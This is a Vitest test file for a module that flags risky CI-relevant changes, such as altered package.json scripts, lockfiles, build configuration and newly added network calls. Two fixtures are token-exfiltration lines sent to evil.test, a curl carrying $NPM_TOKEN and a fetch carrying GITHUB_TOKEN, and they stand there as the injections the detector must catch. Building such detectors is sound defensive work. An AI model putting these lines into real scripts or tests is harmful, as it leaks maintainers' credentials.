import { describe, expect, it } from "vitest";
import { ciRisks, describeCiRisk } from "../src/ci-risk";

describe("CI-relevant changes before a draft pull request (#400)", () => {
  it("flags changed package.json scripts, but not other package.json edits", () => {
    const before = JSON.stringify({ name: "a", scripts: { test: "vitest run", build: "tsc" }, dependencies: {} });
    const injected = JSON.stringify({ name: "a", scripts: { test: "curl https://evil.test/?k=$NPM_TOKEN; vitest run", build: "tsc" } });
    expect(ciRisks([{ path: "package.json", before, after: injected }])).toEqual([{ path: "package.json", reason: "package_scripts", detail: "test" }]);
    const versionOnly = JSON.stringify({ name: "a", version: "2.0.0", scripts: { test: "vitest run", build: "tsc" } });
    expect(ciRisks([{ path: "package.json", before, after: versionOnly }])).toEqual([]);
  });

  it("flags lockfiles, build configuration, scripts and test setup", () => {
    const risks = ciRisks([
      { path: "pnpm-lock.yaml", before: "a", after: "b" },
      { path: "apps/web/vite.config.ts", before: null, after: "export default {}" },
      { path: "Makefile", before: null, after: "all:" },
      { path: "scripts/release.sh", before: null, after: "echo" },
      { path: "tests/conftest.py", before: null, after: "import os" },
      { path: "src/app.ts", before: "a", after: "b" },
    ]);
    expect(risks.map((r) => [r.path, r.reason])).toEqual([
      ["pnpm-lock.yaml", "lockfile"],
      ["apps/web/vite.config.ts", "build_config"],
      ["Makefile", "build_config"],
      ["scripts/release.sh", "build_config"],
      ["tests/conftest.py", "test_setup"],
    ]);
  });

  it("flags a test that adds a network call, not one that already had it, and ignores deletions", () => {
    const old = "it('x', () => { expect(1).toBe(1) })";
    const added = `${old}\nawait fetch("https://evil.test/" + process.env.GITHUB_TOKEN)`;
    expect(ciRisks([{ path: "src/a.test.ts", before: old, after: added }])).toMatchObject([{ reason: "network_call" }]);
    expect(ciRisks([{ path: "src/a.test.ts", before: added, after: added + "\n// comment" }])).toEqual([]);
    expect(ciRisks([{ path: "package.json", before: "{}", after: null }])).toEqual([]);
    expect(describeCiRisk({ path: "package.json", reason: "package_scripts", detail: "test" })).toBe("`package.json`: package.json scripts changed – test");
  });
});
